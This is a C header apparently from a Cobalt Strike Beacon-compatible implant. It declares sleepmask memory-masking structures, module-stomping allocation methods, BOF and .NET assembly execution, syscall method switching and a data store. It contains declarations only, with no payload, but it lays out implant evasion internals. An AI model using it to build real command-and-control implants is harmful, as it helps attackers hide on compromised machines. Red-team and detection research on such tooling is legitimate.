#pragma once
#include <Windows.h>
#include "track_memory.h"

#define DATA_STORE_TYPE_EMPTY        0
#define DATA_STORE_TYPE_GENERAL_FILE 1
#define DATA_STORE_TYPE_BOF          2
#define DATA_STORE_TYPE_DOTNET       3

#ifndef MASK_SIZE
#define MASK_SIZE 13
#endif

typedef struct {
	char * ptr;
	size_t size;
} HEAP_RECORD_DS; /* alias; HEAP_RECORD lives in track_memory.h */

/* BeaconInformation and the 4.10+ sleepmask contract: the arsenal kit's
 * beacon.h layouts (frozen with 4.12). A sleepmask object reads this to mask
 * Beacon itself - the beacon memory region's sections, and the heap records
 * - so the sizes and offsets must stay the kit's. Enum constants carry an
 * AM_ prefix here only to keep our namespace tidy; their values are the
 * kit's. */
typedef enum {
	AM_PURPOSE_EMPTY = 0,
	AM_PURPOSE_GENERIC_BUFFER,
	AM_PURPOSE_BEACON_MEMORY,
	AM_PURPOSE_SLEEPMASK_MEMORY,
	AM_PURPOSE_BOF_MEMORY,
	AM_PURPOSE_UDC2_MEMORY
} ALLOCATED_MEMORY_PURPOSE;

typedef enum {
	AM_LABEL_EMPTY = 0,
	AM_LABEL_BUFFER,
	AM_LABEL_PEHEADER,
	AM_LABEL_TEXT,
	AM_LABEL_RDATA,
	AM_LABEL_DATA,
	AM_LABEL_PDATA,
	AM_LABEL_RELOC
} ALLOCATED_MEMORY_LABEL;

typedef enum {
	AM_METHOD_UNKNOWN = 0,
	AM_METHOD_VIRTUALALLOC,
	AM_METHOD_HEAPALLOC,
	AM_METHOD_MODULESTOMP,
	AM_METHOD_NTMAPVIEW
} ALLOCATED_MEMORY_ALLOCATION_METHOD;

typedef struct { PVOID HeapHandle; BOOL DestroyHeap; } AM_HEAPALLOC_INFO;
typedef struct { HMODULE ModuleHandle; } AM_MODULESTOMP_INFO;
typedef union {
	AM_HEAPALLOC_INFO    HeapAllocInfo;
	AM_MODULESTOMP_INFO  ModuleStompInfo;
	PVOID                Custom;
} ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION;

typedef struct {
	BOOL Cleanup;
	ALLOCATED_MEMORY_ALLOCATION_METHOD AllocationMethod;
	ALLOCATED_MEMORY_ADDITIONAL_CLEANUP_INFORMATION AdditionalCleanupInformation;
} ALLOCATED_MEMORY_CLEANUP_INFORMATION;

typedef struct {
	ALLOCATED_MEMORY_LABEL Label;
	PVOID  BaseAddress;
	SIZE_T VirtualSize;
	DWORD  CurrentProtect;
	DWORD  PreviousProtect;
	BOOL   MaskSection;
	DWORD  DripLoadPageSize;
} ALLOCATED_MEMORY_SECTION;

typedef struct {
	ALLOCATED_MEMORY_PURPOSE Purpose;
	PVOID  AllocationBase;
	SIZE_T RegionSize;
	DWORD  Type;
	DWORD  DripLoadAllocationGranularity;
	ALLOCATED_MEMORY_SECTION Sections[8];
	ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation;
} ALLOCATED_MEMORY_REGION;

typedef struct {
	ALLOCATED_MEMORY_REGION AllocatedMemoryRegions[6];
} ALLOCATED_MEMORY;

/* version format: 0xMMmmPP (0x041300 = 4.13) */
typedef struct {
	unsigned int version;
	char  * sleep_mask_ptr;
	DWORD   sleep_mask_text_size;
	DWORD   sleep_mask_total_size;
	char  * beacon_ptr;
	HEAP_RECORD * heap_records;
	char    mask[MASK_SIZE];
	ALLOCATED_MEMORY allocatedMemory;
} BEACON_INFO;

typedef struct {
	int type;
	DWORD64 hash;
	BOOL masked;
	char * buffer;
	size_t length;
} DATA_STORE_OBJECT, *PDATA_STORE_OBJECT;

void cs49_apply_settings(void);

void command_data_store(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_data_store_inline_execute(char * buffer, int length);
void command_data_store_execute_assembly(char * buffer, int length, BOOL x86, BOOL ignoreToken);
void command_syscall_method_change(char * buffer, int length, void (*callback)(char * buffer, int length, int type));
void command_syscall_method_query(void (*callback)(char * buffer, int length, int type));
int  syscall_method_get(void);
void syscall_method_set(int method);

/* Describe ourselves for a sleepmask object (BOF API since 4.10: returns
 * TRUE). beacon_info_fill is the body: sm_* tell where the object that is
 * about to run lives, when one is (the API itself has no such object). */
BOOL BeaconInformation(BEACON_INFO * info);
void beacon_info_fill(BEACON_INFO * info, char * sm_base, DWORD sm_text, DWORD sm_total);
void beacon_sleep_mask_set_exec(char * ptr, DWORD text_size, DWORD total_size);
/* a user mask: leave what the call's arguments point into in the clear */
void beacon_info_keep_plaintext(BEACON_INFO * info, const unsigned long long * args, int nargs, HEAP_RECORD * copy, int max);
BOOL BeaconAddValue(const char * key, void * ptr);
void * BeaconGetValue(const char * key);
BOOL BeaconRemoveValue(const char * key);
PDATA_STORE_OBJECT BeaconDataStoreGetItem(size_t index);
void BeaconDataStoreProtectItem(size_t index);
void BeaconDataStoreUnprotectItem(size_t index);
size_t BeaconDataStoreMaxEntries(void);
char * BeaconGetCustomUserData(void);
void BeaconSetCustomUserData(const void * data);
void BeaconSetUserDataSyscalls(const void * table);

/* test-visible store core */
int datastore_add(int type, unsigned long long hash, char * data, int length);
int datastore_remove_at(int index);
unsigned long long datastore_hash_at(int index);
int datastore_type_at(int index);
void datastore_reset_for_test(int slots);

/* conv 3 - a resident object - reports itself through args: */
typedef struct {
	void * entry;   /* the loaded entry point: call it by address, no load in between */
	char * base;    /* its block (BEACON_INFO.sleep_mask_ptr) */
	DWORD  text;    /* the block's code part */
	DWORD  total;   /* the whole block */
} RESIDENT_OBJECT;

BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen, int conv);
